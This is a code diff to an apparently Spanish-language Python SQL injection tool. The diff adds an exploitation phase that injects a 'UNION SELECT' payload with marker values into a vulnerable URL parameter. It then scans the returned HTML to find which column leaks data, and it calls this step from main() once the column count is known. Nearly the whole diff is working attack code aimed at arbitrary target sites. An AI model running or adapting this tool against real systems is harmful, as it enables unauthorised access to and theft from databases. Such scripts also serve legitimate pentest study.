@@ -1,3 +1,4 @@
+from random import random
 import requests
 import argparse
 import sys
@@ -119,6 +120,31 @@ def obtener_num_columnas(url, param_vulnerable, otros_params):
     print("[-] No se pudo determinar el número de columnas con UNION SELECT.")
     return None, None
 
+def encontrar_columna_visible(url, param_vulnerable, otros_params, num_cols):
+    """
+    Fase 2 Explotación: Determinar qué columna imprime datos en pantalla.
+    """
+    print("[*] Buscando columna visible...")
+    
+    # Creamos un payload tipo: UNION SELECT 1111, 2222, 3333...
+    # Usamos números únicos para buscarlos en el HTML
+    marcadores = [str(i)*4 for i in range(1, num_cols + 1)]
+    union_payload = f"1' UNION SELECT {','.join(marcadores)} -- -"
+    
+    params = otros_params.copy()
+    params[param_vulnerable] = union_payload
+    
+
+    html = realizar_peticion(url, params)
+    
+
+    for i, marcador in enumerate(marcadores):
+        if marcador in html:
+            print(f"[+] Columna visible encontrada: {i + 1}")
+            return i + 1
+            
+    print("[-] No se encontró ninguna columna visible (Blind SQLi?).")
+    return None
 
 def parse_args():
 
@@ -187,6 +213,9 @@ def main():
         print("\n[+] La URL es vulnerable a SQL Injection.")
 
         num_columnas, tipo_inyeccion = obtener_num_columnas(target_url, vuln_param, otros_params)
+
+        if num_columnas:
+            encontrar_columna_visible(target_url, vuln_param, otros_params, num_columnas)
 
 
     else:
